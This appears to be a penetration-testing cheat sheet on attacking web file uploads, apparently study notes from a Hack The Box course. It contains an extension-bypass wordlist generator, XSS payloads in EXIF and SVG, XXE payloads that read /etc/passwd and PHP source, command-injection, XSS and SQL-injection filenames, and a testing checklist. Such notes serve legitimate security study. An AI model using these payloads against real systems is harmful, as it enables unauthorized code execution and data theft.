# File Upload

## Character Injection
- We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
- Characters:
    - `%20`
    - `%0a`
    - `%00`
    - `%0d0a`
    - `/`
    - `.\`
    - `.`
    - `…`
    - `:`

- Small bash script generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```


## Limited File Uploads
- **XSS**
    - Exif tool
    ```bash
    exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
    exiftool HTB.jpg
    ...SNIP...
    Comment                         :  "><img src=1 onerror=alert(window.origin)>
    ```

    - SVG
    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
        <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
        <script type="text/javascript">alert(window.origin);</script>
    </svg>
    ```

- **XXE**
    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg>&xxe;</svg>
    ```

    ```XML
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
    <svg>&xxe;</svg>
    ```

## Other Upload Attacks
- Injections in File Name
    -  If the web application uses the file name within an OS command: `file$(whoami).jpg` or (file`whoami`.jpg) or `file.jpg||whoami`
    - We may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`)
    - We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

- Windows-specific Attacks
    - One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards.
    - We may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`)

## Testing
- Bypasses
    - [ ] Check client-side validation
    - [ ] Fuzzing extensions to bypass blacklisted filters
    - [ ] Trying for double extensions e.g. [PHP Extenstions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
    - [ ] Check Content-type header validation
    - [ ] Check MIME-Type validation

